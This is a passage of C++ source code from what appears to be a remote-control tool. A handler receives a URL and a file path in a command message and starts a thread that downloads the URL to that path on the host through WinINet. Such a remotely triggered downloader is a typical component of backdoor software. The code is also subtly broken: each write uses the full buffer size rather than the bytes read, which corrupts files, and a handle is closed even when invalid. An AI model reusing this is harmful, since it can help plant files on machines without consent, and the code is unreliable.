	HINTERNET hIURL;

	hIURL = InternetOpenUrl(hINet,url.c_str(),NULL,0,INTERNET_FLAG_RELOAD,0);

	if (hIURL == NULL)
	{
		goto CLOSE1;
	}
	BOOL bWrite  =  0;
	DWORD dwWirtten  =  0;

	HANDLE hFile;

	hFile = CreateFile(path.c_str(),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		goto CLOSE1;
	}

	BOOL hIRead  =  0;

	while(1)
	{
		hIRead = InternetReadFile(hIURL,buffer,sizeof(buffer),&dwRead);

		if(dwRead == 0)
			break;

		SetFilePointer(hFile,0,0,FILE_END);

		bWrite = WriteFile(hFile,buffer,sizeof(buffer),&dwWirtten,NULL);

	}


CLOSE1:
	CloseHandle(hFile);
	InternetCloseHandle(hIURL);
	InternetCloseHandle(hINet);

	delete pArg;

	return;
}


BOOL Manager::ExecuteRCCommand_HttpDown(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
{
	PARSE_COMMDATA(pData, dwSize);
	DECLARE_STR_PARAM(url);
	DECLARE_STR_PARAM(path);

	PDOWNARG pArg = new DOWNARG;

	pArg->path = path;
	pArg->url = url;

	_beginthread(DownThread,0,pArg);
	
	return TRUE;

}